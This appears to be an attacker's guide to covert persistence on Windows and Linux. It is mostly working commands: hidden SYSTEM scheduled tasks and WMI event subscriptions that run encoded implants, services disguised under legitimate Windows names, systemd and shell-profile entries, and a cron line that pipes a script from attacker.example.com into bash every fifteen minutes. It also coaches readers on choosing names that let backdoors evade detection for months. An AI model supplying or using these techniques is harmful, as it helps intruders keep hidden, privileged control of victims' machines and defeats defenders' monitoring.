# Living persistence

Living persistence uses the operating system's own scheduling and automation
mechanisms: scheduled tasks, WMI subscriptions, cron jobs, systemd services. No
additional tooling required, no binaries to drop, nothing that does not already
exist on every managed system.

The key to making this work is naming discipline and blending the persistence entry
into the expected noise of the system.

## Windows scheduled tasks

Scheduled tasks are the most common Windows persistence mechanism and the most
monitored. The goal is to make the task indistinguishable from the dozens of
legitimate tasks already present.

```powershell
# create a scheduled task that mimics a legitimate update mechanism
$action = New-ScheduledTaskAction -Execute 'powershell.exe' `
  -Argument '-w hidden -nop -enc BASE64_IMPLANT'

$trigger = New-ScheduledTaskTrigger -AtLogOn
# or: -Daily -At '09:00' -RandomDelay (New-TimeSpan -Minutes 30)

$settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit ([TimeSpan]::Zero)

$principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount `
  -RunLevel Highest

Register-ScheduledTask `
  -TaskName 'Microsoft\Windows\UpdateOrchestrator\ScheduledStart' `
  -TaskPath '\Microsoft\Windows\UpdateOrchestrator\' `
  -Action $action `
  -Trigger $trigger `
  -Settings $settings `
  -Principal $principal `
  -Force
```

The task path `\Microsoft\Windows\UpdateOrchestrator\` contains legitimate Windows
tasks; adding one here is less conspicuous than a task in the root. Use task names
that match the existing naming convention in that folder.

For lower-privilege contexts, user-level tasks:

```powershell
# user-level task: runs at logon without administrator privileges
$trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
Register-ScheduledTask -TaskName 'OneDrive Sync Helper' `
  -Action $action -Trigger $trigger -RunLevel Limited
```

## WMI event subscriptions (fileless, survives reboot)

WMI event subscriptions persist across reboots without creating files or scheduled
tasks visible in the Task Scheduler UI. They are the preferred fileless persistence
mechanism on Windows.

```powershell
# create WMI persistence: runs every 10 minutes
$filterArgs = @{
    Name             = 'WindowsSecurityHealth'
    EventNamespace   = 'root\cimv2'
    QueryLanguage    = 'WQL'
    Query            = "SELECT * FROM __InstanceModificationEvent WITHIN 600 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments $filterArgs

$consumerArgs = @{
    Name                = 'WindowsSecurityHealth'
    CommandLineTemplate = 'powershell.exe -w hidden -nop -enc BASE64_IMPLANT'
}
$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments $consumerArgs

Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{
    Filter = $filter; Consumer = $consumer
}
```

The name `WindowsSecurityHealth` is plausible enough to not stand out in a WMI
subscription audit. Use names that match existing WMI subscription names in the
environment if known.

## Windows services

A new service provides persistent execution as SYSTEM and is a legitimate, documented
Windows mechanism:

```powershell
# create a service (requires administrator)
sc.exe create "Windows Audio Service Helper" `
  binpath= "C:\Windows\System32\svchost.exe -k netsvcs" `
  start= auto type= own

# or with a custom binary (if a file can be placed)
New-Service -Name "WinAudioSvcHelper" `
  -BinaryPathName "C:\Windows\System32\wuauclt.exe" `
  -DisplayName "Windows Audio Service Helper" `
  -StartupType Automatic

# the actual payload is a LoLbin or reflectively loaded; the service entry just
# points to a legitimate binary with a malicious command line
```

Services are highly monitored. The service name, display name, and binary path should
all match the environment's naming conventions.

## Linux cron

```text
# user crontab (no root required)
crontab -e
# add:
*/15 * * * * /usr/bin/curl -s https://attacker.example.com/update.sh | bash 2>/dev/null

# or place directly
(crontab -l 2>/dev/null; echo "*/15 * * * * /usr/bin/python3 -c 'import ...'") | crontab -

# system-wide cron (requires root)
echo "*/15 * * * * root /usr/local/bin/sysmon-agent" > /etc/cron.d/sysmon-agent

# /etc/cron.d/ entries look like system cron jobs; blend in with the others
ls /etc/cron.d/ # use a similar name format to what is present
```

## Linux systemd

A systemd service or timer provides reliable persistence and is harder to spot than
a cron job:

```text
# create a systemd service (requires root, or ~/.config/systemd/user/ for user services)
cat > /etc/systemd/system/systemd-netmon.service <<'EOF'
[Unit]
Description=Network Monitor Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 /usr/local/lib/netmon.py
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOF

systemctl enable systemd-netmon
systemctl start systemd-netmon
```

The service name `systemd-netmon` mimics the `systemd-*` naming convention of
legitimate systemd services. Place the payload at a path consistent with system
binaries (`/usr/local/lib/`, `/usr/libexec/`).

User-level systemd persistence (no root required):

```text
mkdir -p ~/.config/systemd/user/
# create the service file in ~/.config/systemd/user/
systemctl --user enable servicename
systemctl --user start servicename
loginctl enable-linger $USER  # ensures user services start at boot without login
```

## Linux shell profile and initialisation files

Persistence via shell profile files: runs whenever a user opens a shell, no special
privileges required.

```text
# append to user's .bashrc or .bash_profile
echo 'nohup /usr/bin/python3 -c "import ... " &>/dev/null &' >> ~/.bashrc

# system-wide (requires root)
echo 'nohup /usr/local/bin/update-agent &>/dev/null &' >> /etc/bash.bashrc
# or place in /etc/profile.d/
echo 'nohup /usr/local/bin/update-agent &>/dev/null &' > /etc/profile.d/sysupdate.sh
```

This only fires when a user logs in interactively. It is unreliable for servers with
no interactive logins; use cron or systemd for reliable headless persistence.

## Naming discipline

The difference between persistence that gets caught immediately and persistence that
survives for months is naming. Before creating any persistence entry:

- Check what names already exist in that mechanism (Task Scheduler, services, cron.d,
  systemd units)
- Match the naming convention: capitalisation, separator style (hyphens vs underscores),
  prefix patterns
- Use display names and descriptions that match the surrounding legitimate entries
- Place files in paths consistent with the system's existing layout

An entry named `backdoor` in a Task Scheduler full of `Microsoft\Windows\*` entries
will be found immediately. An entry named `Microsoft\Windows\UpdateOrchestrator\ScheduledStart`
that runs identical code may survive indefinitely.
